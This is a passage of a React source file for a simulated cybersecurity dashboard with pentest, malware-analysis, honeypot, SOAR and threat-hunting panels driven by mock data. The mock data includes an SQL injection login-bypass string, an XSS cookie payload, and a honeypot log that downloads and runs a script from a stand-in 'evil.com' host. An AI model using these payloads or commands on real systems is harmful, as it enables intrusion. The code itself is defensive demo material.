import { useState } from 'react';
import { 
  Shield, AlertTriangle, Search, Target, Globe, Lock, 
  FileSearch, Activity, Server, Database,
  Terminal, Code, Bug, Eye, EyeOff,
  RefreshCw, Play, StopCircle, Download, Upload,
  CheckCircle, XCircle, Clock, ChevronRight,
  Save, Trash2, Copy,
  Settings, User,
  FileText, FolderOpen,
  Cloud, MapPin, Network, Sword,
  ShieldCheck, Scan, FileCode,
  Sparkles, Brain,
  Info,
  X, Plus
} from 'lucide-react';
import { 
  ResponsiveContainer,
  RadarChart, Radar, PolarGrid,
  PolarAngleAxis, PolarRadiusAxis
} from 'recharts';
import { motion } from 'framer-motion';

// ==================== ADVANCED FEATURES TYPES ====================

// Pentesting Types
interface PentestTarget {
  id: string;
  url: string;
  status: 'idle' | 'scanning' | 'completed' | 'failed';
  progress: number;
  findings: PentestFinding[];
  scanStartTime?: Date;
  scanEndTime?: Date;
}

interface PentestFinding {
  id: string;
  type: 'sqli' | 'xss' | 'dir_traversal' | 'csrf' | 'ssl_misconfig' | 'header_missing' | 'open_port';
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  title: string;
  description: string;
  evidence: string;
  remediation: string;
  cveIds?: string[];
  owaspCategory: string;
}

// Malware Analysis Types
interface MalwareSample {
  id: string;
  filename: string;
  hash: {
    md5: string;
    sha1: string;
    sha256: string;
  };
  size: number;
  fileType: string;
  uploadTime: Date;
  status: 'analyzing' | 'completed' | 'failed';
  detections: {
    engine: string;
    result: string;
    category?: string;
  }[];
  staticAnalysis: {
    strings: string[];
    imports: string[];
    sections: { name: string; entropy: number }[];
    suspiciousApis: string[];
  };
  behaviorAnalysis: {
    fileOperations: string[];
    registryOperations: string[];
    networkConnections: string[];
    processes: string[];
  };
  yaraMatches: string[];
  entropy: number;
  verdict: 'malicious' | 'suspicious' | 'clean' | 'unknown';
  confidence: number;
}

// SOAR Types
interface Playbook {
  id: string;
  name: string;
  description: string;
  trigger: {
    type: 'alert' | 'schedule' | 'manual';
    condition?: string;
  };
  actions: PlaybookAction[];
  isActive: boolean;
  executionCount: number;
  lastExecuted?: Date;
}

interface PlaybookAction {
  id: string;
  type: 'block_ip' | 'disable_user' | 'isolate_host' | 'send_email' | 'send_slack' | 'create_ticket' | 'webhook' | 'wait' | 'condition';
  config: Record<string, any>;
  delay?: number;
}

interface Incident {
  id: string;
  title: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  status: 'open' | 'in_progress' | 'resolved' | 'closed';
  createdAt: Date;
  assignedTo?: string;
  playbookId?: string;
  playbookExecution?: PlaybookExecution;
  affectedAssets: string[];
  indicators: string[];
  timeline: IncidentEvent[];
}

interface PlaybookExecution {
  playbookId: string;
  startedAt: Date;
  completedAt?: Date;
  status: 'running' | 'completed' | 'failed';
  actions: ExecutedAction[];
}

interface ExecutedAction {
  actionId: string;
  type: string;
  status: 'pending' | 'running' | 'success' | 'failed';
  startedAt?: Date;
  completedAt?: Date;
  output?: string;
  error?: string;
}

interface IncidentEvent {
  timestamp: Date;
  type: 'alert' | 'action' | 'note' | 'status_change';
  description: string;
  actor?: string;
}

// Red Team / Blue Team Types
interface AttackScenario {
  id: string;
  name: string;
  description: string;
  type: 'brute_force' | 'sql_injection' | 'xss' | 'ddos' | 'port_scan' | 'malware' | 'phishing';
  difficulty: 'easy' | 'medium' | 'hard';
  estimatedDuration: number;
  tactics: MITRETactic[];
}

interface MITRETactic {
  technique: string;
  tactic: string;
  procedure: string;
  detection: string;
  mitigation: string;
}

interface SimulationSession {
  id: string;
  scenarioId: string;
  status: 'preparing' | 'running' | 'paused' | 'completed';
  startTime?: Date;
  endTime?: Date;
  redTeamScore: number;
  blueTeamScore: number;
  events: SimulationEvent[];
  currentPhase: number;
}

interface SimulationEvent {
  timestamp: Date;
  team: 'red' | 'blue';
  type: 'attack' | 'defense' | 'detection' | 'mitigation';
  description: string;
  points: number;
  technique?: string;
}

// Honeypot Types
interface Honeypot {
  id: string;
  name: string;
  type: 'ssh' | 'http' | 'ftp' | 'rdp' | 'database';
  port: number;
  status: 'active' | 'inactive';
  interactions: HoneypotInteraction[];
  stats: {
    totalInteractions: number;
    uniqueAttackers: number;
    commandsCaptured: number;
    filesDownloaded: number;
  };
}

interface HoneypotInteraction {
  id: string;
  timestamp: Date;
  attackerIp: string;
  attackerGeo?: { country: string; city: string };
  sessionDuration: number;
  commands: string[];
  filesAccessed: string[];
  credentialsAttempted: string[];
  userAgent?: string;
}

// Threat Hunting Types
interface HuntingQuery {
  id: string;
  name: string;
  description: string;
  query: string;
  createdBy: string;
  createdAt: Date;
  lastRun?: Date;
  resultCount?: number;
  isFavorite: boolean;
}

// Dark Web / Threat Intel Types
interface DarkWebFinding {
  id: string;
  source: string;
  type: 'leaked_credentials' | 'data_breach' | 'exploit_sale' | 'malware_sale' | 'discussions';
  title: string;
  description: string;
  discoveredAt: Date;
  severity: 'critical' | 'high' | 'medium' | 'low';
  affectedEntities: string[];
  iocs: string[];
  price?: string;
  seller?: string;
}

interface ReputationResult {
  indicator: string;
  type: 'ip' | 'domain' | 'hash';
  reputation: 'malicious' | 'suspicious' | 'clean' | 'unknown';
  score: number;
  sources: { name: string; verdict: string }[];
  firstSeen?: Date;
  lastSeen?: Date;
  relatedThreats: string[];
}

// Cloud Security Types
interface CloudAccount {
  id: string;
  provider: 'aws' | 'azure' | 'gcp';
  accountId: string;
  name: string;
  region: string;
  status: 'connected' | 'disconnected' | 'error';
  findings: CloudFinding[];
  resources: {
    type: string;
    count: number;
    misconfigured: number;
  }[];
}

interface CloudFinding {
  id: string;
  resourceType: string;
  resourceId: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  title: string;
  description: string;
  remediation: string;
  complianceFrameworks: string[];
}

// Zero Trust Types
interface ZeroTrustSession {
  id: string;
  userId: string;
  deviceId: string;
  ipAddress: string;
  trustScore: number;
  authenticationFactors: string[];
  deviceTrust: number;
  behaviorScore: number;
  locationRisk: number;
  accessGranted: boolean;
  startTime: Date;
  lastActivity: Date;
}

// AI Prediction Types
interface AttackPrediction {
  id: string;
  timestamp: Date;
  predictedAttackType: string;
  confidence: number;
  indicators: string[];
  affectedAssets: string[];
  recommendedActions: string[];
  historicalAccuracy: number;
}

// Attack Graph Types
interface AttackNode {
  id: string;
  type: 'attacker' | 'exploit' | 'vulnerability' | 'asset' | 'impact';
  label: string;
  severity?: 'critical' | 'high' | 'medium' | 'low';
  details: Record<string, any>;
}

interface AttackEdge {
  source: string;
  target: string;
  label: string;
  probability: number;
}

interface AttackPath {
  id: string;
  nodes: AttackNode[];
  edges: AttackEdge[];
  totalProbability: number;
  impact: number;
  mitigationCost: number;
}

// ==================== MOCK DATA ====================

const mockPentestFindings: PentestFinding[] = [
  {
    id: '1',
    type: 'sqli',
    severity: 'critical',
    title: 'SQL Injection in Login Form',
    description: 'The login form is vulnerable to SQL injection attacks, allowing authentication bypass.',
    evidence: "Input: admin' OR '1'='1' -- resulted in successful authentication",
    remediation: 'Use parameterized queries and input validation. Implement WAF rules.',
    cveIds: ['CVE-2023-1234'],
    owaspCategory: 'A03:2021 - Injection'
  },
  {
    id: '2',
    type: 'xss',
    severity: 'high',
    title: 'Stored XSS in Comment Section',
    description: 'User comments are not properly sanitized, allowing stored XSS attacks.',
    evidence: '<script>alert(document.cookie)</script> was stored and executed',
    remediation: 'Implement output encoding and Content Security Policy (CSP).',
    cveIds: ['CVE-2023-5678'],
    owaspCategory: 'A03:2021 - Injection'
  },
  {
    id: '3',
    type: 'header_missing',
    severity: 'medium',
    title: 'Missing Security Headers',
    description: 'Several security headers are missing from HTTP responses.',
    evidence: 'X-Frame-Options, X-XSS-Protection, Content-Security-Policy not present',
    remediation: 'Add security headers to all HTTP responses.',
    owaspCategory: 'A05:2021 - Security Misconfiguration'
  }
];

const mockMalwareSamples: MalwareSample[] = [
  {
    id: '1',
    filename: 'invoice.exe',
    hash: {
      md5: 'd41d8cd98f00b204e9800998ecf8427e',
      sha1: 'da39a3ee5e6b4b0d3255bfef95601890afd80709',
      sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
    },
    size: 245760,
    fileType: 'PE32 executable (GUI) Intel 80386',
    uploadTime: new Date(Date.now() - 3600000),
    status: 'completed',
    detections: [
      { engine: 'Kaspersky', result: 'Trojan.Win32.Agent', category: 'trojan' },
      { engine: 'Malwarebytes', result: 'Malware.AI.123456', category: 'malware' },
      { engine: 'Symantec', result: 'Trojan.Gen.2', category: 'trojan' },
      { engine: 'Microsoft', result: 'Trojan:Win32/Casdet', category: 'trojan' },
      { engine: 'Avast', result: 'Clean', category: 'clean' }
    ],
    staticAnalysis: {
      strings: ['CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory', 'http://malicious.com/c2'],
      imports: ['kernel32.dll', 'ws2_32.dll', 'wininet.dll'],
      sections: [
        { name: '.text', entropy: 6.8 },
        { name: '.data', entropy: 4.2 },
        { name: '.rsrc', entropy: 7.9 }
      ],
      suspiciousApis: ['CreateRemoteThread', 'VirtualAllocEx', 'InternetOpenUrlA']
    },
    behaviorAnalysis: {
      fileOperations: ['Created: C:\\Windows\\Temp\\tmp.dat', 'Modified: Registry\\Run'],
      registryOperations: ['HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'],
      networkConnections: ['TCP 185.220.101.42:443', 'DNS query: malicious.com'],
      processes: ['Created: svchost.exe (injected)', 'Terminated: explorer.exe']
    },
    yaraMatches: ['MALWARE_Trojan_Win32_Generic', 'SUSPICIOUS_Packed_PE'],
    entropy: 7.8,
    verdict: 'malicious',
    confidence: 95
  }
];

const mockPlaybooks: Playbook[] = [
  {
    id: '1',
    name: 'Brute Force Response',
    description: 'Automatically respond to brute force attacks',
    trigger: { type: 'alert', condition: 'failed_logins > 5 in 5 minutes' },
    actions: [
      { id: '1', type: 'block_ip', config: { duration: '24h' } },
      { id: '2', type: 'send_email', config: { to: 'security@company.com', template: 'brute_force_alert' } },
      { id: '3', type: 'send_slack', config: { channel: '#security-alerts' } },
      { id: '4', type: 'create_ticket', config: { priority: 'high', assignee: 'soc-team' } }
    ],
    isActive: true,
    executionCount: 47
  },
  {
    id: '2',
    name: 'Malware Detection Response',
    description: 'Isolate infected hosts and alert team',
    trigger: { type: 'alert', condition: 'malware_detected' },
    actions: [
      { id: '1', type: 'isolate_host', config: { method: 'network_quarantine' } },
      { id: '2', type: 'disable_user', config: { force_logout: true } },
      { id: '3', type: 'send_email', config: { to: 'ir@company.com', template: 'malware_incident' } },
      { id: '4', type: 'webhook', config: { url: 'https://api.company.com/incidents', method: 'POST' } }
    ],
    isActive: true,
    executionCount: 12
  }
];

const mockAttackScenarios: AttackScenario[] = [
  {
    id: '1',
    name: 'Credential Brute Force',
    description: 'Attempt to gain access through password guessing',
    type: 'brute_force',
    difficulty: 'easy',
    estimatedDuration: 10,
    tactics: [
      {
        technique: 'T1110 - Brute Force',
        tactic: 'Credential Access',
        procedure: 'Use common password list against admin account',
        detection: 'Monitor for multiple failed login attempts',
        mitigation: 'Implement account lockout and MFA'
      }
    ]
  },
  {
    id: '2',
    name: 'SQL Injection Attack',
    description: 'Exploit SQL injection vulnerability in login form',
    type: 'sql_injection',
    difficulty: 'medium',
    estimatedDuration: 15,
    tactics: [
      {
        technique: 'T1190 - Exploit Public-Facing Application',
        tactic: 'Initial Access',
        procedure: 'Inject SQL payload to bypass authentication',
        detection: 'Monitor for SQL error messages and unusual queries',
        mitigation: 'Use parameterized queries and WAF'
      }
    ]
  },
  {
    id: '3',
    name: 'Network Port Scan',
    description: 'Reconnaissance through port scanning',
    type: 'port_scan',
    difficulty: 'easy',
    estimatedDuration: 5,
    tactics: [
      {
        technique: 'T1046 - Network Service Scanning',
        tactic: 'Discovery',
        procedure: 'Scan target network for open ports and services',
        detection: 'Monitor for connection attempts to multiple ports',
        mitigation: 'Implement network segmentation and IDS'
      }
    ]
  }
];

const mockHoneypots: Honeypot[] = [
  {
    id: '1',
    name: 'SSH Honeypot',
    type: 'ssh',
    port: 2222,
    status: 'active',
    interactions: [
      {
        id: '1',
        timestamp: new Date(Date.now() - 3600000),
        attackerIp: '185.220.101.42',
        attackerGeo: { country: 'Russia', city: 'Moscow' },
        sessionDuration: 245,
        commands: ['uname -a', 'cat /etc/passwd', 'wget http://evil.com/malware.sh', 'chmod +x malware.sh', './malware.sh'],
        filesAccessed: ['/etc/passwd', '/etc/shadow'],
        credentialsAttempted: ['root:root', 'admin:admin', 'user:password123']
      }
    ],
    stats: {
      totalInteractions: 156,
      uniqueAttackers: 89,
      commandsCaptured: 1247,
      filesDownloaded: 23
    }
  },
  {
    id: '2',
    name: 'HTTP Honeypot',
    type: 'http',
    port: 8080,
    status: 'active',
    interactions: [],
    stats: {
      totalInteractions: 423,
      uniqueAttackers: 201,
      commandsCaptured: 0,
      filesDownloaded: 15
    }
  }
];

const mockHuntingQueries: HuntingQuery[] = [
  {
    id: '1',
    name: 'Failed Login Spike',
    description: 'Detect unusual spike in failed login attempts',
    query: 'source_type:auth AND event_type:failed_login | stats count by source_ip | where count > 10',
    createdBy: 'Alex Morgan',
    createdAt: new Date(Date.now() - 86400000 * 7),
    lastRun: new Date(Date.now() - 3600000),
    resultCount: 5,
    isFavorite: true
  },
  {
    id: '2',
    name: 'Suspicious PowerShell',
    description: 'Find suspicious PowerShell execution patterns',
    query: 'process_name:powershell.exe AND (command_line:*-enc* OR command_line:*-encodedcommand*)',
    createdBy: 'Sarah Chen',
    createdAt: new Date(Date.now() - 86400000 * 14),
    lastRun: new Date(Date.now() - 7200000),
    resultCount: 2,
    isFavorite: false
  }
];

const mockDarkWebFindings: DarkWebFinding[] = [
  {
    id: '1',
    source: 'RaidForums',
    type: 'leaked_credentials',
    title: 'Company Database Leaked',
    description: 'Database containing 50,000 user credentials found for sale',
    discoveredAt: new Date(Date.now() - 86400000 * 2),
    severity: 'critical',
    affectedEntities: ['company.com'],
    iocs: ['company_db_2024.sql', 'dump@darkweb.com'],
    price: '$500 BTC',
    seller: 'DarkSeller99'
  },
  {
    id: '2',
    source: 'Exploit.in',
    type: 'exploit_sale',
    title: 'Zero-Day Exploit for Sale',
    description: 'Unpatched RCE vulnerability in popular CMS',
    discoveredAt: new Date(Date.now() - 86400000),
    severity: 'high',
    affectedEntities: ['WordPress', 'Drupal'],
    iocs: ['CVE-2024-XXXX'],
    price: '$5000 BTC',
    seller: 'ExploitMaster'
  }
];

const mockCloudAccounts: CloudAccount[] = [
  {
    id: '1',
    provider: 'aws',
    accountId: '123456789012',
    name: 'Production AWS',
    region: 'us-east-1',
    status: 'connected',
    findings: [
      {
        id: '1',
        resourceType: 'S3 Bucket',
        resourceId: 'company-backups',
        severity: 'critical',
        title: 'Public S3 Bucket',
        description: 'S3 bucket is publicly accessible',
        remediation: 'Remove public access policy from bucket',
        complianceFrameworks: ['SOC2', 'PCI-DSS']
      },
      {
        id: '2',
        resourceType: 'Security Group',
        resourceId: 'sg-12345',
        severity: 'high',
        title: 'Overly Permissive Security Group',
        description: 'Security group allows SSH from 0.0.0.0/0',
        remediation: 'Restrict SSH access to specific IP ranges',
        complianceFrameworks: ['CIS']
      }
    ],
    resources: [
      { type: 'EC2 Instances', count: 45, misconfigured: 3 },
      { type: 'S3 Buckets', count: 12, misconfigured: 1 },
      { type: 'RDS Databases', count: 8, misconfigured: 0 },
      { type: 'Lambda Functions', count: 67, misconfigured: 5 }
    ]
  }
];

const mockZeroTrustSessions: ZeroTrustSession[] = [
  {
    id: '1',
    userId: 'user@company.com',
    deviceId: 'device-123',
    ipAddress: '192.168.1.100',
    trustScore: 85,
    authenticationFactors: ['password', 'mfa_totp'],
    deviceTrust: 90,
    behaviorScore: 80,
    locationRisk: 20,
    accessGranted: true,
    startTime: new Date(Date.now() - 3600000),
    lastActivity: new Date()
  },
  {
    id: '2',
    userId: 'admin@company.com',
    deviceId: 'device-456',
    ipAddress: '203.0.113.50',
    trustScore: 45,
    authenticationFactors: ['password'],
    deviceTrust: 60,
    behaviorScore: 30,
    locationRisk: 80,
    accessGranted: false,
    startTime: new Date(Date.now() - 1800000),
    lastActivity: new Date()
  }
];

const mockAttackPredictions: AttackPrediction[] = [
  {
    id: '1',
    timestamp: new Date(),
    predictedAttackType: 'Ransomware',
    confidence: 78,
    indicators: ['Unusual file encryption activity', 'SMB traffic spike', 'Suspicious PowerShell commands'],
    affectedAssets: ['File Server 01', 'Workstation WS-123'],
    recommendedActions: ['Enable enhanced logging', 'Isolate affected systems', 'Backup critical data'],
    historicalAccuracy: 82
  },
  {
    id: '2',
    timestamp: new Date(Date.now() - 3600000),
    predictedAttackType: 'Credential Stuffing',
    confidence: 65,
    indicators: ['Multiple failed logins from same IP', 'Unusual login times'],
    affectedAssets: ['Web Application'],
    recommendedActions: ['Enable CAPTCHA', 'Implement rate limiting', 'Alert security team'],
    historicalAccuracy: 75
  }
];

const mockAttackPaths: AttackPath[] = [
  {
    id: '1',
    nodes: [
      { id: 'attacker', type: 'attacker', label: 'External Attacker', details: { ip: '185.220.101.42' } },
      { id: 'phishing', type: 'exploit', label: 'Phishing Email', severity: 'high', details: { technique: 'T1566' } },
      { id: 'cred', type: 'vulnerability', label: 'Stolen Credentials', severity: 'critical', details: { user: 'employee@company.com' } },
      { id: 'workstation', type: 'asset', label: 'User Workstation', details: { hostname: 'WS-001' } },
      { id: 'lateral', type: 'exploit', label: 'Lateral Movement', severity: 'high', details: { technique: 'T1021' } },
      { id: 'dc', type: 'asset', label: 'Domain Controller', details: { hostname: 'DC-01' } },
      { id: 'data', type: 'impact', label: 'Data Exfiltration', details: { records: 50000 } }
    ],
    edges: [
      { source: 'attacker', target: 'phishing', label: 'sends', probability: 0.8 },
      { source: 'phishing', target: 'cred', label: 'harvests', probability: 0.6 },
      { source: 'cred', target: 'workstation', label: 'accesses', probability: 0.9 },
      { source: 'workstation', target: 'lateral', label: 'enables', probability: 0.7 },
      { source: 'lateral', target: 'dc', label: 'compromises', probability: 0.5 },
      { source: 'dc', target: 'data', label: 'exfiltrates', probability: 0.8 }
    ],
    totalProbability: 0.06,
    impact: 1500000,
    mitigationCost: 50000
  }
];

// ==================== COMPONENT: WEB APP PENTESTING ====================

const PentestingModule = () => {
  const [targets, setTargets] = useState<PentestTarget[]>([]);
  const [newTargetUrl, setNewTargetUrl] = useState('');
  const [selectedTarget, setSelectedTarget] = useState<PentestTarget | null>(null);
  const [scanOptions, setScanOptions] = useState({
    sqli: true,
    xss: true,
    dirBrute: true,
    headers: true,
    ssl: true,
    ports: false
  });

  const addTarget = () => {
    if (!newTargetUrl) return;
    const target: PentestTarget = {
      id: Date.now().toString(),
      url: newTargetUrl,
      status: 'idle',
      progress: 0,
      findings: []
    };
    setTargets([...targets, target]);
    setNewTargetUrl('');
  };

  const startScan = async (targetId: string) => {
    setTargets(targets.map(t => 
      t.id === targetId 
        ? { ...t, status: 'scanning', scanStartTime: new Date(), progress: 0 }
        : t
    ));

    // Simulate scan progress
    for (let i = 0; i <= 100; i += 10) {
      await new Promise(r => setTimeout(r, 500));
      setTargets(prev => prev.map(t => 
        t.id === targetId ? { ...t, progress: i } : t
      ));
    }

    // Add mock findings
    setTargets(prev => prev.map(t => 
      t.id === targetId 
        ? { 
            ...t, 
            status: 'completed', 
            progress: 100,
            scanEndTime: new Date(),
            findings: mockPentestFindings.filter(() => Math.random() > 0.3)
          }
        : t
    ));
  };

  const generateReport = (target: PentestTarget) => {
    const report = {
      target: target.url,
      scanDate: target.scanEndTime,
      summary: {
        total: target.findings.length,
        critical: target.findings.filter(f => f.severity === 'critical').length,
        high: target.findings.filter(f => f.severity === 'high').length,
        medium: target.findings.filter(f => f.severity === 'medium').length,
        low: target.findings.filter(f => f.severity === 'low').length
      },
      findings: target.findings
    };
    
    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `pentest-report-${target.id}.json`;
    a.click();
  };

  return (
    <div className="space-y-6">
      {/* Target Input */}
      <div className="cyber-card p-6">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center space-x-2">
          <Target className="w-5 h-5 text-cyber-lime" />
          <span>Add Target</span>
        </h3>
        <div className="flex space-x-4">
          <input
            type="url"
            placeholder="https://example.com"
            value={newTargetUrl}
            onChange={(e) => setNewTargetUrl(e.target.value)}
            className="cyber-input flex-1"
          />
          <button onClick={addTarget} className="cyber-button flex items-center space-x-2">
            <Plus className="w-4 h-4" />
            <span>Add Target</span>
          </button>
        </div>
      </div>

      {/* Scan Options */}
      <div className="cyber-card p-6">
        <h3 className="text-lg font-semibold text-white mb-4">Scan Configuration</h3>
        <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
          {[
            { key: 'sqli', label: 'SQL Injection', icon: Database },
            { key: 'xss', label: 'XSS Detection', icon: Code },
            { key: 'dirBrute', label: 'Directory Brute Force', icon: FolderOpen },
            { key: 'headers', label: 'Security Headers', icon: Shield },
            { key: 'ssl', label: 'SSL/TLS Analysis', icon: Lock },
            { key: 'ports', label: 'Port Scan', icon: Network }
          ].map((option) => (
            <label key={option.key} className="flex items-center space-x-3 p-3 bg-cyber-dark rounded-lg cursor-pointer hover:bg-cyber-gray transition-colors">
              <input
                type="checkbox"
                checked={scanOptions[option.key as keyof typeof scanOptions]}
                onChange={(e) => setScanOptions({ ...scanOptions, [option.key]: e.target.checked })}
                className="w-4 h-4 accent-cyber-lime"
              />
              <option.icon className="w-4 h-4 text-cyber-lime" />
              <span className="text-white text-sm">{option.label}</span>
            </label>
          ))}
        </div>
      </div>

      {/* Targets List */}
      <div className="cyber-card">
        <div className="p-4 border-b border-cyber-light">
          <h3 className="text-lg font-semibold text-white">Scan Targets</h3>
        </div>
        <div className="p-4">
          {targets.length === 0 ? (
            <div className="text-center py-8 text-cyber-muted">
              <Target className="w-12 h-12 mx-auto mb-4 opacity-50" />
              <p>No targets added yet</p>
            </div>
          ) : (
            <div className="space-y-4">
              {targets.map((target) => (
                <div key={target.id} className="p-4 bg-cyber-dark rounded-lg border border-cyber-light">
                  <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center space-x-3">
                      <Globe className="w-5 h-5 text-cyber-lime" />
                      <span className="text-white font-medium">{target.url}</span>
                      <span className={`text-xs px-2 py-1 rounded ${
                        target.status === 'completed' ? 'bg-green-500/20 text-green-500' :
                        target.status === 'scanning' ? 'bg-yellow-500/20 text-yellow-500' :
                        target.status === 'failed' ? 'bg-red-500/20 text-red-500' :
                        'bg-cyber-muted/20 text-cyber-muted'
                      }`}>
                        {target.status.toUpperCase()}
                      </span>
                    </div>
                    <div className="flex items-center space-x-2">
                      {target.status === 'idle' && (
                        <button 
                          onClick={() => startScan(target.id)}
                          className="cyber-button text-sm flex items-center space-x-1"
                        >
                          <Play className="w-3 h-3" />
                          <span>Scan</span>
                        </button>
                      )}
                      {target.status === 'completed' && (
                        <>
                          <button 
                            onClick={() => setSelectedTarget(target)}
                            className="cyber-button-outline text-sm"
                          >
                            View Findings
                          </button>
                          <button 
                            onClick={() => generateReport(target)}
                            className="p-2 text-cyber-lime hover:bg-cyber-lime/10 rounded"
                          >
                            <Download className="w-4 h-4" />
                          </button>
                        </>
                      )}
                      <button 
                        onClick={() => setTargets(targets.filter(t => t.id !== target.id))}
                        className="p-2 text-red-500 hover:bg-red-500/10 rounded"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                  
                  {target.status === 'scanning' && (
                    <div className="mb-3">
                      <div className="flex justify-between text-sm text-cyber-muted mb-1">
                        <span>Scanning...</span>
                        <span>{target.progress}%</span>
                      </div>
                      <div className="h-2 bg-cyber-gray rounded-full overflow-hidden">
                        <div 
                          className="h-full bg-cyber-lime rounded-full transition-all duration-300"
                          style={{ width: `${target.progress}%` }}
                        />
                      </div>
                    </div>
                  )}

                  {target.findings.length > 0 && (
                    <div className="flex items-center space-x-4 text-sm">
                      <span className="text-cyber-muted">
                        Total: <span className="text-white">{target.findings.length}</span>
                      </span>
                      <span className="text-red-500">
                        Critical: {target.findings.filter(f => f.severity === 'critical').length}
                      </span>
                      <span className="text-orange-500">
                        High: {target.findings.filter(f => f.severity === 'high').length}
                      </span>
                      <span className="text-yellow-500">
                        Medium: {target.findings.filter(f => f.severity === 'medium').length}
                      </span>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Findings Modal */}
      {selectedTarget && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-4xl max-h-[90vh] bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-cyber-light">
              <h2 className="text-xl font-bold text-white">Scan Findings - {selectedTarget.url}</h2>
              <button onClick={() => setSelectedTarget(null)} className="p-2 text-cyber-muted hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6 overflow-y-auto max-h-[calc(90vh-80px)]">
              {selectedTarget.findings.length === 0 ? (
                <div className="text-center py-8 text-cyber-muted">
                  <CheckCircle className="w-12 h-12 mx-auto mb-4 text-green-500" />
                  <p>No vulnerabilities found!</p>
                </div>
              ) : (
                <div className="space-y-4">
                  {selectedTarget.findings.map((finding) => (
                    <div key={finding.id} className="p-4 bg-cyber-gray rounded-lg border-l-4 border-red-500">
                      <div className="flex items-start justify-between mb-2">
                        <h4 className="text-white font-medium">{finding.title}</h4>
                        <div className="flex items-center space-x-2">
                          <span className={`text-xs px-2 py-1 rounded ${
                            finding.severity === 'critical' ? 'bg-red-500/20 text-red-500' :
                            finding.severity === 'high' ? 'bg-orange-500/20 text-orange-500' :
                            finding.severity === 'medium' ? 'bg-yellow-500/20 text-yellow-500' :
                            'bg-blue-500/20 text-blue-500'
                          }`}>
                            {finding.severity.toUpperCase()}
                          </span>
                          <span className="text-xs px-2 py-1 rounded bg-cyber-lime/20 text-cyber-lime">
                            {finding.owaspCategory}
                          </span>
                        </div>
                      </div>
                      <p className="text-sm text-cyber-muted mb-3">{finding.description}</p>
                      <div className="bg-cyber-dark p-3 rounded mb-3">
                        <div className="text-xs text-cyber-muted mb-1">Evidence:</div>
                        <code className="text-sm text-cyber-lime font-mono">{finding.evidence}</code>
                      </div>
                      <div className="bg-green-500/10 border border-green-500/30 p-3 rounded">
                        <div className="text-xs text-green-500 mb-1">Remediation:</div>
                        <p className="text-sm text-white">{finding.remediation}</p>
                      </div>
                      {finding.cveIds && (
                        <div className="mt-3 flex items-center space-x-2">
                          <span className="text-xs text-cyber-muted">Related CVEs:</span>
                          {finding.cveIds.map(cve => (
                            <span key={cve} className="text-xs px-2 py-1 rounded bg-cyber-lime/20 text-cyber-lime">
                              {cve}
                            </span>
                          ))}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
};

// ==================== COMPONENT: MALWARE ANALYSIS ENGINE ====================

const MalwareAnalysisEngine = () => {
  const [samples, setSamples] = useState<MalwareSample[]>(mockMalwareSamples);
  const [selectedSample, setSelectedSample] = useState<MalwareSample | null>(null);
  const [isUploading, setIsUploading] = useState(false);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [activeTab, setActiveTab] = useState<'overview' | 'static' | 'behavior' | 'yara'>('overview');

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    setIsUploading(true);
    setUploadProgress(0);

    // Simulate upload progress
    for (let i = 0; i <= 100; i += 10) {
      await new Promise(r => setTimeout(r, 200));
      setUploadProgress(i);
    }

    // Create mock sample
    const newSample: MalwareSample = {
      id: Date.now().toString(),
      filename: file.name,
      hash: {
        md5: Array(32).fill(0).map(() => Math.random().toString(16)[2]).join(''),
        sha1: Array(40).fill(0).map(() => Math.random().toString(16)[2]).join(''),
        sha256: Array(64).fill(0).map(() => Math.random().toString(16)[2]).join('')
      },
      size: file.size,
      fileType: file.type || 'Unknown',
      uploadTime: new Date(),
      status: 'analyzing',
      detections: [],
      staticAnalysis: { strings: [], imports: [], sections: [], suspiciousApis: [] },
      behaviorAnalysis: { fileOperations: [], registryOperations: [], networkConnections: [], processes: [] },
      yaraMatches: [],
      entropy: Math.random() * 8,
      verdict: 'unknown',
      confidence: 0
    };

    setSamples([newSample, ...samples]);
    setIsUploading(false);
    setUploadProgress(0);

    // Simulate analysis completion
    setTimeout(() => {
      setSamples(prev => prev.map(s => 
        s.id === newSample.id 
          ? { 
              ...s, 
              status: 'completed',
              detections: mockMalwareSamples[0].detections,
              staticAnalysis: mockMalwareSamples[0].staticAnalysis,
              behaviorAnalysis: mockMalwareSamples[0].behaviorAnalysis,
              yaraMatches: mockMalwareSamples[0].yaraMatches,
              verdict: Math.random() > 0.5 ? 'malicious' : 'suspicious',
              confidence: Math.floor(Math.random() * 30) + 70
            }
          : s
      ));
    }, 3000);
  };

  const getVerdictColor = (verdict: string) => {
    switch (verdict) {
      case 'malicious': return 'text-red-500';
      case 'suspicious': return 'text-orange-500';
      case 'clean': return 'text-green-500';
      default: return 'text-cyber-muted';
    }
  };

  return (
    <div className="space-y-6">
      {/* Upload Area */}
      <div className="cyber-card p-6">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center space-x-2">
          <Upload className="w-5 h-5 text-cyber-lime" />
          <span>Upload Sample</span>
        </h3>
        <div className="border-2 border-dashed border-cyber-light rounded-lg p-8 text-center hover:border-cyber-lime transition-colors">
          <input
            type="file"
            onChange={handleFileUpload}
            className="hidden"
